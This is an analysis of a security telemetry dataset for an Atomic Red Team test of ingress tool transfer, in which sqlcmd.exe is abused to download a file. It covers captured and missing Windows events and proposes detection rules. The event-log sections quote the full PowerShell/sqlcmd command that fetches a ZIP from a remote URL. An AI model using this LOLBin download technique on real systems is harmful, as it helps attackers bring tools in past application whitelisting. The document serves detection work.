# T1105-32: Ingress Tool Transfer — File Download with Sqlcmd.exe

## Technique Context

T1105 Ingress Tool Transfer covers adversaries moving tools or files from an external system into a compromised environment. This specific test demonstrates abuse of sqlcmd.exe, the SQL Server command-line utility, for file downloads. While sqlcmd.exe is primarily designed for database administration, it can be misused as a Living Off The Land Binary (LOLBin) for downloading files from remote URLs.

The detection community focuses on unusual network activity from legitimate administrative tools, command-line arguments containing URLs in unexpected contexts, and file creation patterns that indicate tool transfer. This technique matters because it allows attackers to leverage trusted, signed binaries to bypass application whitelisting and avoid network monitoring focused on traditional download tools.

## What This Dataset Contains

The dataset captures a PowerShell-orchestrated execution of sqlcmd.exe for file download. Key evidence includes:

**PowerShell Script Block Logging (EID 4104):** The attack command is clearly captured: `{sqlcmd -i https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1105/src/T1105.zip -o C:\T1105.zip}`, showing sqlcmd.exe being instructed to read input from a GitHub URL and output to a local ZIP file.

**Security Event Logs (EID 4688):** Process creation events show the execution chain: powershell.exe → powershell.exe with command line `"powershell.exe" & {sqlcmd -i https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1105/src/T1105.zip -o C:\T1105.zip}`.

**Sysmon Process Creation (EID 1):** Captured the PowerShell process with the full command line containing the sqlcmd execution, providing process lineage and timing information.

**Image Loading Events (EID 7):** Multiple PowerShell processes loading .NET runtime components and Windows Defender integration DLLs, indicating the execution environment setup.

**Network Activity (EID 3):** Two outbound HTTPS connections from Windows Defender (MsMpEng.exe) to IP 48.211.71.194 on port 443, likely related to threat intelligence or signature updates during the test execution.

## What This Dataset Does Not Contain

Critically missing are the key telemetry events that would demonstrate the actual file download:

**No sqlcmd.exe Process Creation:** The sqlcmd.exe process creation is not captured in Sysmon EID 1 events, likely because the sysmon-modular configuration's include-mode filtering doesn't classify sqlcmd.exe as a suspicious LOLBin pattern.

**No Network Connections from sqlcmd.exe:** Sysmon EID 3 network events don't show the expected HTTPS connection to github.com from sqlcmd.exe, which would be the primary indicator of the file download attempt.

**No File Creation for Downloaded Content:** Missing Sysmon EID 11 file creation events for C:\T1105.zip, suggesting the download either failed or was blocked by Windows Defender before completion.

**No sqlcmd.exe Security Events:** The Security log lacks 4688/4689 events for sqlcmd.exe execution, indicating the process may not have successfully started.

## Assessment

This dataset provides excellent evidence of the attack initiation through PowerShell script block logging but lacks the crucial execution telemetry that would confirm sqlcmd.exe actually performed the file download. The missing sqlcmd.exe process creation and network events significantly limit the dataset's utility for developing comprehensive detection rules for this specific LOLBin abuse technique.

The PowerShell evidence is valuable for detecting the command construction and execution attempt, but defenders need the actual sqlcmd.exe process and network telemetry to build robust detections. This appears to be a case where Windows Defender may have blocked the execution before sqlcmd.exe could establish network connections.

## Detection Opportunities Present in This Data

1. **PowerShell Script Block Monitoring:** Detect PowerShell script blocks containing "sqlcmd" combined with "-i" parameter and URL patterns (https://) indicating potential file download abuse.

2. **Process Command Line Analysis:** Monitor Security EID 4688 events for powershell.exe processes with command lines containing sqlcmd execution patterns, particularly with remote URL arguments.

3. **Administrative Tool Abuse Pattern:** Alert on PowerShell spawning SQL Server utilities (sqlcmd.exe) in non-database administration contexts, especially with URL parameters.

4. **PowerShell Module Loading:** Correlate System.Management.Automation.dll loading with subsequent suspicious command executions as an early indicator.

5. **Execution Policy Bypass Detection:** Monitor for Set-ExecutionPolicy cmdlet invocations to "Bypass" as a precursor to malicious PowerShell activity.

6. **Parent-Child Process Relationships:** Detect unusual process lineage where PowerShell spawns database administration tools outside expected administrative workflows.
